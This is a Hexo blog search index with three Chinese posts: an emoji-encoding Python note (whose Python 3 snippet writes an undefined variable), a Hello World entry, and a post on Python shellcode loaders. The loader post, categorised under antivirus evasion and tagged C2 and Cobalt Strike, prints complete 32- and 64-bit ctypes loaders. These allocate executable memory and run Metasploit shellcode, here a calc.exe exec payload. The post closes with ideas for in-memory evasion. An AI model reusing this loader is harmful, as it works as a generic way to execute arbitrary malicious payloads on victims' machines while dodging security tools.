<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python3 表情字符写入文本</title>
      <link href="/2021/12/07/python3-%E8%A1%A8%E6%83%85%E5%AD%97%E7%AC%A6%E5%86%99%E5%85%A5%E6%96%87%E6%9C%AC/"/>
      <url>/2021/12/07/python3-%E8%A1%A8%E6%83%85%E5%AD%97%E7%AC%A6%E5%86%99%E5%85%A5%E6%96%87%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h3 id="python3爬虫遇到emoji-表情字符-或特殊字符时-无法将字符写入到文本文件。"><a href="#python3爬虫遇到emoji-表情字符-或特殊字符时-无法将字符写入到文本文件。" class="headerlink" title="python3爬虫遇到emoji 表情字符 或特殊字符时 无法将字符写入到文本文件。"></a>python3爬虫遇到emoji 表情字符 或特殊字符时 无法将字符写入到文本文件。</h3><p>python2</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dc</span>=&#x27;%uD<span class="hljs-number">83</span>C%uDF<span class="hljs-number">52</span>%uD<span class="hljs-number">83</span>C%uDF<span class="hljs-number">52</span>%<span class="hljs-number">20</span>%u<span class="hljs-number">5</span>C<span class="hljs-number">0</span>F%u<span class="hljs-number">6</span>A<span class="hljs-number">31</span>%u<span class="hljs-number">5</span>B<span class="hljs-number">50</span>&#x27; <br><span class="hljs-comment">#爬取到的unicode格式字符串  原型(🍒🍒小樱子)</span><br><br><span class="hljs-attribute">dc</span>=dc.replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>)#转换格式<br><span class="hljs-attribute">dc</span>=dc.decode(<span class="hljs-string">&quot;unicode_escape&quot;</span>)#unicode_escape   编码适合作为 ASCII 编码的 Python 源代码中的 Unicode 文字的内容，但引号不会被转义。从 Latin-<span class="hljs-number">1</span> 源代码解码。<br><br><span class="hljs-attribute">dc</span>=dc.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-attribute">with</span> open(<span class="hljs-string">&quot;1.txt&quot;</span>,&#x27;a+&#x27;) as f:<br><span class="hljs-attribute">f</span>.write(dc)<br></code></pre></td></tr></table></figure><hr><p>同样的代码 因为python2 与 python3 的一些特性 导致python3下写入文本出错。</p><p>原理很简单,特性有点烦人。</p><hr><p>python3</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tmp=<span class="hljs-string">&#x27;%uD83C%uDF52%uD83C%uDF52%20%u5C0F%u6A31%u5B50&#x27;</span><br><br>tmp=tmp<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>)<br>tmp=tmp<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;latin_1&quot;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&quot;raw_unicode_escape&quot;</span>)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-16&#x27;</span>,<span class="hljs-string">&#x27;surrogatepass&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-16&#x27;</span>,<span class="hljs-string">&#x27;surrogatepass&#x27;</span>)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;raw_unicode_escape&quot;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&quot;unicode_escape&quot;</span>)<br><br>with open(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-16&quot;</span>) as f:<br>f<span class="hljs-selector-class">.write</span>(a)<br></code></pre></td></tr></table></figure><p>写入文件的编码转换重点不在于编码上的转换，写入文件打开的默认编码格式也要注意。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python shellcode loader</title>
      <link href="/2021/11/06/python-shellcode-loader/"/>
      <url>/2021/11/06/python-shellcode-loader/</url>
      
        <content type="html"><![CDATA[<p>#python shellcode loader </p><p>示列代码 32位环境:</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#python 3.7.0 32bit  </span><br><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># Metasploit windows/x86/exec calc.exe 32位payload</span><br><br><span class="hljs-keyword">import</span> ctypes<span class="hljs-comment">#加载dll，C数据类型。</span><br><br>buf =  <span class="hljs-string">b&quot;&quot;</span><br>buf += <span class="hljs-string">b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><br>buf += <span class="hljs-string">b&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br>buf += <span class="hljs-string">b&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><br>buf += <span class="hljs-string">b&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><br>buf += <span class="hljs-string">b&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><br>buf += <span class="hljs-string">b&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><br>buf += <span class="hljs-string">b&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><br>buf += <span class="hljs-string">b&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><br>buf += <span class="hljs-string">b&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><br>buf += <span class="hljs-string">b&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span><br>buf += <span class="hljs-string">b&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span><br>buf += <span class="hljs-string">b&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span><br>buf += <span class="hljs-string">b&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><br><br><br><span class="hljs-comment">#将字节类型payload  转换为字节数组bytearray, </span><br>shellcode=<span class="hljs-built_in">bytearray</span>(buf)<br><br><br><span class="hljs-comment">#调用VirtualAlloc函数，来申请一块动态内存区域。 </span><br>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), <span class="hljs-comment">#要分配的内存区域的地址0或None为线程指向,也可指向一个未占用的内存地址</span><br>                                          ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)),<span class="hljs-comment">#分配的大小</span><br>                                          ctypes.c_int(<span class="hljs-number">0x3000</span>),<span class="hljs-comment">#分配的类型 为原型0x1000 0x2000的合并  </span><br>                                          ctypes.c_int(<span class="hljs-number">0x40</span>))<span class="hljs-comment">#该内存的初始保护属性 可读可写可执行</span><br><span class="hljs-comment">#将shellcode 放进申请内存空间 </span><br>buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br><br>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<span class="hljs-comment">#指向移动目的地址的指针。</span><br>                                     buf,<span class="hljs-comment">#指向要复制的内存地址的指针。</span><br>                                     ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)))<span class="hljs-comment">#指定要复制的字节数。</span><br>                                     <br>                                     <br><span class="hljs-comment">#调用CreateThread将在主线程的基础上创建一个新线程,创建一个线程从shellcode放置位置开始执行</span><br>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#线程安全属性</span><br>                                         ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#置初始栈的大小，以字节为单位</span><br>                                         ctypes.c_int(ptr),<span class="hljs-comment">#指向线程函数的指针</span><br>                                         ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#向线程函数传递的参数</span><br>                                         ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#线程创建属性</span><br>                                         ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))<span class="hljs-comment">#保存新线程的id</span><br><br><span class="hljs-comment">#等待创建的线程运行结束   一个是创建的线程，一个是等待时间  时间=-1 无限等待</span><br><br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="hljs-number">1</span>))<br><br></code></pre></td></tr></table></figure><p>参考来自：<br>XG小刚 <a href="https://mp.weixin.qq.com/s/-WcEW1aznO2IuCezkCe9HQ">https://mp.weixin.qq.com/s/-WcEW1aznO2IuCezkCe9HQ</a><br><a href="https://www.cnblogs.com/Akkuman/p/11851057.html">https://www.cnblogs.com/Akkuman/p/11851057.html</a><br>感谢两位帅哥</p><p>简单来说 shellcode是一段可执行的十六进制代码, 加载器就是申请一片可读可写可执行的内存空间,将shellcode 放进一个内存空间,从shellcode的头部开始执行。实现将shellcode 执行的原理。大部分语言的加载器都是基于C 的 “ffi”(Foreign function interface   外部函数接口). 原理都是一样的。以自己目前的认知来看所这样的。 </p><hr><p>主要的代码:<br>以下代码 某句语句  也可用其他方式执行shellcode。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kernel32<span class="hljs-selector-class">.dll</span> 的VirtualAlloc 函数，申请一块可读可写可执行的空间.<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.VirtualAlloc</span>   <br><br>kernel32<span class="hljs-selector-class">.dll</span> 的RtlMoveMemory 将shellcode 放进申请好的空间<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.RtlMoveMemory</span><br><br>kernel32<span class="hljs-selector-class">.dll</span> 的CreateThread 创建一个新的线程,执行指向内存空间的代码<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.CreateThread</span><br><br>等待创建线程结束<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.WaitForSingleObject</span><br><br></code></pre></td></tr></table></figure><hr><p>shellcode的类型转换 也可采用ctypes.c_char_p(buf) 的类型 替代 RtlMoveMemory 指向要复制的内存地址的指针。  或者shellcode不转换类型也可以成功加载，这一点有点不理解。 RtlMoveMemory 的参数应该是要复制过去的内存的指针地址, 可未编码的shellcode只是一串字节类型十六进制的code。 并没有明确指向地址,看RtlMoveMemory的原型也没看到这一点，除非这一段声明的变量放入的过程中  是会把地址默认加载过去。这样的话 下面的类型转换是否有点多余。  </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span>=bytearray(buf)<br><span class="hljs-attr">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)<br></code></pre></td></tr></table></figure><hr><p>示列代码需要在32位python3环境 和32位payload 下运行,否则会出现写入访问从突的错误,该错误 由于VirtualAlloc的默认返回类型不与64为兼容引发的错误<br>设置VirtualAlloc返回类型为ctypes.c_uint64<br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</p><hr><p>以下是64位环境的示列代码,唯一与上面不同的就是payload不同,数据类型不一样(ctypes.c_uint64):</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">import ctypes<br><br>shellcode =  b&quot;&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>41&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>48&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>0f&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>7c&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>52&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>8b&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>56&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d6<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>e0&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>58&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>44&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>5a&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>48&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>41&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>41&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>c4<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>06&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>6a&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>2e<span class="hljs-symbol">\x</span>65&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>00&quot;<br><br>shellcode = bytearray(shellcode)<br># 设置VirtualAlloc返回类型为ctypes.c_uint64<br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br># 申请内存<br>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))<br> <br># 放入shellcode<br>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)<br>ctypes.windll.kernel32.RtlMoveMemory(<br>    ctypes.c_uint64(ptr), <br>    buf, <br>    ctypes.c_int(len(shellcode))<br>)<br># 创建一个线程从shellcode放置位置首地址开始执行<br>handle = ctypes.windll.kernel32.CreateThread(<br>    ctypes.c_int(0), <br>    ctypes.c_int(0), <br>    ctypes.c_uint64(ptr), <br>    ctypes.c_int(0), <br>    ctypes.c_int(0), <br>    ctypes.pointer(ctypes.c_int(0))<br>)<br># 等待上面创建的线程运行完<br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))<br></code></pre></td></tr></table></figure><hr><p>个人所想的：<br>对于内存免杀方面,我是否可以将shellcode 放在同一个线程，n个不同的地址上面,执行的时候依次按顺序执行。shellcode 不出现合并的情况下不过好像无法从不同的地址上执行,貌似可以在线程里在申请一块内存空间,将n个地址放进去 执行。  对此是否可在忽略c2特征的情况下 实现内存的高级免杀。还是想实现不同地址的shellcode 依次执行 达到加载shellcode 的方法。理论上来看好像有点不现实。</p><p>##end</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python  </tag>
            
            <tag> shellcode </tag>
            
            <tag> C2 </tag>
            
            <tag> cobalt strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/03/hello-world/"/>
      <url>/2021/11/03/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>每一次的 “hello world” 意味着一次开始，我知道开始，但未知结束。这是一条只有开始 没有结束的道路。不知是否有人已寻找到终点。但愿每个人都能找到自己的终点，而并非 “hello world” 的终点，将 “hello world” 画上一个句号之前，不要早已离去在这条道路上。。</p>]]></content>
      
      
      <categories>
          
          <category> 日常记录 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
